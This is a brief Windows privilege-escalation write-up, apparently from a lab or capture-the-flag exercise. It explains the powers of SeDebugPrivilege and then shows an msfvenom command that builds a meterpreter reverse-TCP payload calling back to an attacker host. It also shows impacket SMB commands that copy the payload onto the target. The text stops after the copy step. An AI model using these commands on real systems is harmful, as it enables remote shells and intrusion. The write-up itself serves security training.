What is SeDebugPrivilege?#

he SeDebugPrivilege in Windows allows a user to perform system-level debugging. In simple terms, with this privilege, a user can:

  • Access all system processes: Including those that are normally protected and inaccessible, such as operating system processes and critical services.

  • Modify or terminate protected processes: The user can terminate processes that standard users would not normally be able to stop.

  • Read and write to the memory of any process: This includes the ability to inject code or make real-time modifications to running processes.

This privilege is very powerful and is usually reserved for system accounts and administrators because it can be used to bypass almost all security measures of the operating system.

Privilege Escalation#

We create a file with msfvenom:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.109 LPORT=6969 -f exe -o platanoo.exe

We pass the file back to the victim machine:

sudo impacket-smbserver share -smb2support /tmp/share -user test -password test

net use n: \\10.10.14.109\share /user:test test

copy n:\platanoo.exe
